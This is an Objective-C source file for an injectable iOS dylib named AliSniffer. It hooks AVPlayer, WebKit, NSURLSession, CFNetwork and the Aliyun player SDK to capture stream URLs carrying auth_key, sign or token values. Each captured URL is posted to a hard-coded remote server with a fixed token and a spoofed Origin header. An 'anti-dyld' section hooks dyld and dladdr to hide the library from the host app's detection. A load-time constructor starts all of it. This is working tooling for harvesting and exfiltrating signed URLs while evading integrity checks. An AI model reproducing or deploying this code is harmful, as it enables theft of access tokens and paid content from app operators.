// AliSniffer.m — 稳定版 + anti-dyld 隐身 + 直接生效 + 必弹窗
// 覆盖链路：AVPlayer 入点、AVAssetResourceLoader 包裹、WK 导航、NSURLSessionTask、CFReadStream、
//          AVPlayerItem/AVURLAsset 创建兜底、阿里云 AVPUrlSource/AliPlayer；
//          anti-dyld：隐藏本 dylib 给 _dyld_get_image_name / dladdr / objc_copyImageNames 等。
// 需要与工程内 fishhook.c/h 一起编译。
// 链接：UIKit / Foundation / AVFoundation / WebKit / CoreMedia / CFNetwork / libobjc / libdl(系统自带)

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <dlfcn.h>
#import "fishhook.h"

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088"; // 你的服务器
static NSString * const kPushToken = @"@Yy166431";                  // 你的令牌
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0;
static const BOOL kPopupOnAuth  = YES;   // 命中带 auth/sign/token 的 URL 必弹窗
static const BOOL kPopupOnPlain = YES;   // 其他 URL 也弹窗
static const int  kInitPopupRetry = 3;   // 首屏找不到窗口时，重试弹窗次数
static const NSTimeInterval kInitPopupDelay = 0.7; // 每次重试间隔

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

#pragma mark - 公共工具

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
            if (sc.activationState==UISceneActivationStateForegroundActive){
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win = w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}

static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *win = keyWin(); if (!win) return;
            UIViewController *vc = win.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

// 注入成功必弹窗：找不到窗口时会重试
static void popupInitMessage(void){
    __block int left = kInitPopupRetry + 1;
    void (^tryOnce)(void) = ^{
        left--;
        UIWindow *w = keyWin();
        if (w) {
            popup(@"AliSniffer 已加载", @"稳定版：AV+RL+WK+CF 全启用；anti-dyld 隐身；auth_key 优先；命中即上报与复制。", nil);
        } else if (left > 0) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInitPopupDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), tryOnce);
        }
    };
    on_main(tryOnce);
}

static BOOL hasAuthLike(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] ||
           [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    ||
           [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] ||
        [s containsString:@".ts"]   || [s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"] || [s containsString:@"phonelive"] ||
        [s containsString:@"replay"] || [s containsString:@"pull."] ||
        [s containsString:@"live"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u];
        NSDate *now  = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}
static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}
static void handleURL(NSString *u, NSString *from){
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;
    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
    postText(u);
    if (auth){ if (kPopupOnAuth)  { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
    else     { if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
}

#pragma mark - A) AV 播放链路（AVPlayer + ResourceLoader）

// AVPlayer 入点
static IMP orig_replaceItem = NULL, orig_setItem = NULL;
static void sniff_item(AVPlayerItem *item, NSString *from){
    @try{
        AVURLAsset *asset = (AVURLAsset *)item.asset;
        if ([asset isKindOfClass:AVURLAsset.class]) {
            NSString *u = asset.URL.absoluteString;
            if (u.length) dispatch_async(gq, ^{ handleURL(u, from); });
        }
    }@catch(__unused NSException *e){}
}
static void sn_replaceItem(id self, SEL _cmd, AVPlayerItem *item){
    sniff_item(item, @"AVPlayer.replaceItem");
    ((void(*)(id,SEL,id))orig_replaceItem)(self,_cmd,item);
}
static void sn_setItem(id self, SEL _cmd, AVPlayerItem *item){
    sniff_item(item, @"AVPlayer.setCurrentItem");
    ((void(*)(id,SEL,id))orig_setItem)(self,_cmd,item);
}
static void install_avplayer(void){
    Class P = objc_getClass("AVPlayer"); if (!P) return;
    Method m1 = class_getInstanceMethod(P, sel_getUid("replaceCurrentItemWithPlayerItem:"));
    if (m1){ orig_replaceItem = method_getImplementation(m1); method_setImplementation(m1,(IMP)sn_replaceItem); }
    Method m2 = class_getInstanceMethod(P, sel_getUid("setCurrentItem:"));
    if (m2){ orig_setItem = method_getImplementation(m2); method_setImplementation(m2,(IMP)sn_setItem); }
    LOG("AVPlayer hooks installed");
}

// ResourceLoader 包裹
@interface RLProxy : NSObject<AVAssetResourceLoaderDelegate>
@property (nonatomic, weak) id<AVAssetResourceLoaderDelegate> real;
@end
@implementation RLProxy
- (BOOL)resourceLoader:(AVAssetResourceLoader *)loader shouldWaitForLoadingOfRequestedResource:(AVAssetResourceLoadingRequest *)req {
    @try{
        NSURL *u = req.request ? req.request.URL : nil;
        if (!u) u = [req valueForKeyPath:@"request.URL"];
        if (u.absoluteString.length) dispatch_async(gq, ^{ handleURL(u.absoluteString, @"ResourceLoader"); });
    }@catch(__unused NSException *e){}
    if ([self.real respondsToSelector:_cmd])
        return ((BOOL(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, req);
    return NO;
}
- (void)resourceLoader:(AVAssetResourceLoader *)loader didCancelLoadingRequest:(AVAssetResourceLoadingRequest *)req {
    if ([self.real respondsToSelector:_cmd])
        ((void(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, req);
}
@end

static IMP  orig_rl_setDelegate = NULL;
static void sn_rl_setDelegate(id self, SEL _cmd, id delegate, id queue){
    id wrap = delegate;
    @try{
        if (delegate && ![delegate isKindOfClass:RLProxy.class]){
            RLProxy *p = [RLProxy new]; p.real = delegate; wrap = p;
        }
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL,id,id))orig_rl_setDelegate)(self,_cmd,wrap,queue);
}
static void install_resource_loader_wrap(void){
    Class RL = objc_getClass("AVAssetResourceLoader"); if (!RL) return;
    Method m = class_getInstanceMethod(RL, sel_getUid("setDelegate:queue:"));
    if (!m) return;
    const char *enc = method_getTypeEncoding(m);
    if (!enc || enc[0] != 'v') return;
    orig_rl_setDelegate = method_getImplementation(m);
    method_setImplementation(m, (IMP)sn_rl_setDelegate);
    LOG("RL proxy installed");
}

#pragma mark - B) 阿里云链路

static void hook_AVPUrlSource(void){
    Class c = objc_getClass("AVPUrlSource"); if (!c) return;
    SEL cs = sel_getUid("urlWithString:");
    Method mcls = class_getClassMethod(c, cs);
    if (mcls) {
        IMP orig = method_getImplementation(mcls);
        IMP now  = imp_implementationWithBlock(^id(id _self, NSString *s){
            @try{ if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.urlWithString"); }); }@catch(...) {}
            if (orig){ id(*fn)(id,SEL,NSString*)=(id(*)(id,SEL,NSString*))orig; return fn(_self,cs,s); }
            return (id)nil;
        });
        method_setImplementation(mcls, now);
    }
    SEL is = sel_getUid("setUrl:");
    Method minst = class_getInstanceMethod(c, is);
    if (minst) {
        IMP orig = method_getImplementation(minst);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try{ if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.setUrl"); }); }@catch(...) {}
            if (orig){ void(*fn)(id,SEL,NSString*)=(void(*)(id,SEL,NSString*))orig; fn(_self,is,s); }
        });
        method_setImplementation(minst, now);
    }
}
static void hook_AliPlayer(void){
    Class c = objc_getClass("AliPlayer"); if (!c) return;
    SEL su = sel_getUid("setUrl:");
    Method mu = class_getInstanceMethod(c, su);
    if (mu) {
        IMP orig = method_getImplementation(mu);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try{ if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AliPlayer.setUrl"); }); }@catch(...) {}
            if (orig){ void(*fn)(id,SEL,NSString*)=(void(*)(id,SEL,NSString*))orig; fn(_self,su,s); }
        });
        method_setImplementation(mu, now);
    }
    NSArray<NSString*> *sels = @[@"setStsSource:", @"setAuthSource:", @"setMpsSource:"];
    for (NSString *name in sels){
        SEL s = sel_getUid(name.UTF8String);
        Method m = class_getInstanceMethod(c, s);
        if (!m) continue;
        IMP orig = method_getImplementation(m);
        IMP now  = imp_implementationWithBlock(^(id _self, id src){
            @try{
                NSString *u = nil;
                if ([src respondsToSelector:@selector(valueForKey:)]){
                    @try{ u=[src valueForKey:@"url"]; }@catch(...) {}
                    if (!u){ @try{ u=[src valueForKey:@"playUrl"]; }@catch(...) {} }
                }
                if (u.length) dispatch_async(gq, ^{ handleURL(u, [@"AliPlayer." stringByAppendingString:name]); });
            }@catch(...) {}
            if (orig){ void(*fn)(id,SEL,id)=(void(*)(id,SEL,id))orig; fn(_self,s,src); }
        });
        method_setImplementation(m, now);
    }
}

#pragma mark - C) WK 链路（H5 播放页）

@interface WKNavProxy : NSObject<WKNavigationDelegate>
@property (nonatomic, weak) id<WKNavigationDelegate> real;
@end
@implementation WKNavProxy
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)na decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    @try{
        NSString *u = na.request.URL.absoluteString;
        if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WKNavigation"); });
    }@catch(__unused NSException *e){}
    if ([self.real respondsToSelector:_cmd])
        ((void(*)(id,SEL,id,id,id))objc_msgSend)(self.real,_cmd,webView,na,decisionHandler);
    else decisionHandler(WKNavigationActionPolicyAllow);
}
@end

static IMP orig_wk_setNav = NULL;
static void sn_wk_setNav(id self, SEL _cmd, id delegate){
    id wrap = delegate;
    @try{
        if (delegate && ![delegate isKindOfClass:WKNavProxy.class]){
            WKNavProxy *p = [WKNavProxy new]; p.real = delegate; wrap = p;
        }
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL,id))orig_wk_setNav)(self,_cmd,wrap);
}
static void install_wk(void){
    Class WK = objc_getClass("WKWebView"); if (!WK) return;
    Method m = class_getInstanceMethod(WK, sel_getUid("setNavigationDelegate:"));
    if (!m) return;
    orig_wk_setNav = method_getImplementation(m);
    method_setImplementation(m, (IMP)sn_wk_setNav);
    LOG("WK wrap installed");
}

#pragma mark - D) CFNetwork / NSURLSession / AV 创建兜底

// CFReadStream
static CFReadStreamRef (*orig_CFReadStreamCreateForHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef);
static CFReadStreamRef (*orig_CFReadStreamCreateForStreamedHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef, CFReadStreamRef);

static NSString* urlFromMsg(CFHTTPMessageRef msg){
    if (!msg) return nil;
    CFURLRef url = CFHTTPMessageCopyRequestURL(msg);
    if (!url) return nil;
    return ((__bridge_transfer NSURL*)url).absoluteString;
}
static CFReadStreamRef sn_CFReadStreamCreateForHTTPRequest(CFAllocatorRef a, CFHTTPMessageRef m){
    @try{ NSString *u = urlFromMsg(m); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream"); }); }@catch(__unused NSException *e){}
    return orig_CFReadStreamCreateForHTTPRequest ? orig_CFReadStreamCreateForHTTPRequest(a,m) : NULL;
}
static CFReadStreamRef sn_CFReadStreamCreateForStreamedHTTPRequest(CFAllocatorRef a, CFHTTPMessageRef m, CFReadStreamRef b){
    @try{ NSString *u = urlFromMsg(m); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream(streamed)"); }); }@catch(__unused NSException *e){}
    return orig_CFReadStreamCreateForStreamedHTTPRequest ? orig_CFReadStreamCreateForStreamedHTTPRequest(a,m,b) : NULL;
}
static void install_cf(void){
    struct rebinding rebs[] = {
        {"CFReadStreamCreateForHTTPRequest",         (void*)sn_CFReadStreamCreateForHTTPRequest,         (void**)&orig_CFReadStreamCreateForHTTPRequest},
        {"CFReadStreamCreateForStreamedHTTPRequest", (void*)sn_CFReadStreamCreateForStreamedHTTPRequest, (void**)&orig_CFReadStreamCreateForStreamedHTTPRequest},
    };
    rebind_symbols(rebs, (sizeof rebs/sizeof rebs[0]));
    LOG("CF hooks installed");
}

// NSURLSessionTask resume
static IMP g_orig_resume = NULL;
static void sn_task_resume(id self, SEL _cmd){
    @try{
        NSURLRequest *req = nil;
        if ([self respondsToSelector:@selector(currentRequest)])
            req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("currentRequest"));
        if (!req && [self respondsToSelector:@selector(originalRequest)])
            req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("originalRequest"));
        NSString *s = req.URL.absoluteString;
        if (s.length) dispatch_async(gq, ^{ handleURL(s, @"NSURLSessionTask"); });
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL))g_orig_resume)(self,_cmd);
}
static void install_nsurlsession(void){
    Class c = objc_getClass("NSURLSessionTask"); if (!c) return;
    Method m = class_getInstanceMethod(c, sel_getUid("resume"));
    if (!m) return;
    g_orig_resume = method_getImplementation(m);
    method_setImplementation(m, (IMP)sn_task_resume);
    LOG("NSURLSession resume hooked");
}

// AVPlayerItem / AVURLAsset 创建兜底（IMP 正确保存+强转）
static IMP g_AVPI_urlIMP    = NULL; // +[AVPlayerItem playerItemWithURL:]
static IMP g_AVUA_urloptIMP = NULL; // +[AVURLAsset URLAssetWithURL:options:]

static id sn_AVPI_url(id self, SEL _cmd, NSURL *URL) {
    @try{ if (URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVPlayerItem"); }); } @catch (__unused NSException *e) {}
    if (g_AVPI_urlIMP){ typedef id (*Fn)(id,SEL,NSURL*); return ((Fn)g_AVPI_urlIMP)(self,_cmd,URL); }
    return nil;
}
static id sn_AVUA_urlopt(id self, SEL _cmd, NSURL *URL, id opt) {
    @try{ if (URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVURLAsset"); }); } @catch (__unused NSException *e) {}
    if (g_AVUA_urloptIMP){ typedef id (*Fn)(id,SEL,NSURL*,id); return ((Fn)g_AVUA_urloptIMP)(self,_cmd,URL,opt); }
    return nil;
}
static void install_av_foundation_creators(void){
    Class avpi = objc_getClass("AVPlayerItem");
    if (avpi){
        Method m = class_getClassMethod(avpi, sel_getUid("playerItemWithURL:"));
        if (m){ g_AVPI_urlIMP = method_getImplementation(m); method_setImplementation(m, (IMP)sn_AVPI_url); }
    }
    Class avua = objc_getClass("AVURLAsset");
    if (avua){
        Method m = class_getClassMethod(avua, sel_getUid("URLAssetWithURL:options:"));
        if (m){ g_AVUA_urloptIMP = method_getImplementation(m); method_setImplementation(m, (IMP)sn_AVUA_urlopt); }
    }
}

#pragma mark - E) anti-dyld 隐身（隐藏本 dylib）

// 通过 dladdr 取到本 dylib 的路径与特征名
static NSString *g_selfImagePath   = nil;
static NSString *g_selfImageHint   = @"AliSniffer";   // 关键字
static BOOL imagePathLooksMine(const char *cpath){
    if (!cpath) return NO;
    NSString *p = [NSString stringWithUTF8String:cpath];
    if (!p.length) return NO;
    if (g_selfImagePath.length && [p isEqualToString:g_selfImagePath]) return YES;
    NSString *low = p.lowercaseString;
    if ([low containsString:@"alisniffer"] || [low containsString:@"sniffer"] || [low hasSuffix:@".dylib"])
        return YES;
    return NO;
}

// 1) _dyld_get_image_name / _dyld_image_count
static const char* (*orig__dyld_get_image_name)(uint32_t);
static uint32_t    (*orig__dyld_image_count)(void);

static const char* sn__dyld_get_image_name(uint32_t idx){
    const char *n = orig__dyld_get_image_name ? orig__dyld_get_image_name(idx) : NULL;
    if (imagePathLooksMine(n)) return NULL; // 隐藏本库
    return n;
}
static uint32_t sn__dyld_image_count(void){
    // 不改总数，避免遍历时溢出；只在 get_image_name 返回 NULL 达到隐藏效果
    return orig__dyld_image_count ? orig__dyld_image_count() : 0;
}

// 2) dladdr — 把 dli_fname 伪装成系统库
static int (*orig_dladdr)(const void *, Dl_info *);
static int sn_dladdr(const void *addr, Dl_info *info){
    int r = orig_dladdr ? orig_dladdr(addr, info) : 0;
    if (r && info && info->dli_fname && imagePathLooksMine(info->dli_fname)){
        info->dli_fname = "/System/Library/Frameworks/UIKit.framework/UIKit";
    }
    return r;
}

// 3) objc_copyImageNames / objc_copyClassNamesForImage
typedef const char **(*objc_copyImageNames_t)(unsigned int *outCount);
typedef const char **(*objc_copyClassNamesForImage_t)(const char *image, unsigned int *outCount);

static objc_copyImageNames_t           orig_objc_copyImageNames;
static objc_copyClassNamesForImage_t   orig_objc_copyClassNamesForImage;

static const char **sn_objc_copyImageNames(unsigned int *outCount){
    const char **arr = orig_objc_copyImageNames ? orig_objc_copyImageNames(outCount) : NULL;
    if (!arr || !outCount || *outCount==0) return arr;
    NSMutableArray<NSString*> *list = [NSMutableArray array];
    for (unsigned int i=0;i<*outCount;i++){
        const char *n = arr[i];
        if (!imagePathLooksMine(n)) [list addObject:[NSString stringWithUTF8String:n]];
    }
    // 重新拼成 C 数组
    unsigned int newCount = (unsigned int)list.count;
    char **ret = (char **)calloc(newCount, sizeof(char*));
    for (unsigned int i=0;i<newCount;i++){
        ret[i] = strdup(list[i].UTF8String);
    }
    if (outCount) *outCount = newCount;
    return (const char **)ret;
}
static const char **sn_objc_copyClassNamesForImage(const char *image, unsigned int *outCount){
    if (imagePathLooksMine(image)){
        if (outCount) *outCount = 0;
        return NULL;
    }
    return orig_objc_copyClassNamesForImage ? orig_objc_copyClassNamesForImage(image, outCount) : NULL;
}

static void install_antidyld(void){
    // 记录本库路径
    Dl_info inf = {0};
    if (dladdr((const void*)&install_antidyld, &inf) && inf.dli_fname){
        g_selfImagePath = [NSString stringWithUTF8String:inf.dli_fname] ?: @"";
        LOG("self image: %@", g_selfImagePath);
    }

    struct rebinding rebs[] = {
        {"_dyld_get_image_name",     (void*)sn__dyld_get_image_name,     (void**)&orig__dyld_get_image_name},
        {"_dyld_image_count",        (void*)sn__dyld_image_count,        (void**)&orig__dyld_image_count},
        {"dladdr",                   (void*)sn_dladdr,                    (void**)&orig_dladdr},
        {"objc_copyImageNames",      (void*)sn_objc_copyImageNames,       (void**)&orig_objc_copyImageNames},
        {"objc_copyClassNamesForImage",(void*)sn_objc_copyClassNamesForImage,(void**)&orig_objc_copyClassNamesForImage},
    };
    rebind_symbols(rebs, (sizeof rebs/sizeof rebs[0]));
    LOG("anti-dyld installed");
}

#pragma mark - 入口（注入即启用 + 必弹窗）

__attribute__((constructor))
static void AliSnifferInit(void){
    @try{
        if (!gq)    gq    = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];

        // 先安装 anti-dyld，避免进页枚举到我们秒退
        install_antidyld();

        // 安装抓取链路（全部启用）
        install_avplayer();
        install_resource_loader_wrap();
        install_wk();
        install_cf();
        install_nsurlsession();
        install_av_foundation_creators();
        hook_AVPUrlSource();
        hook_AliPlayer();

        // 注入成功必弹（找不到窗口会自动重试）
        popupInitMessage();
    }@catch(__unused NSException *e){}
}
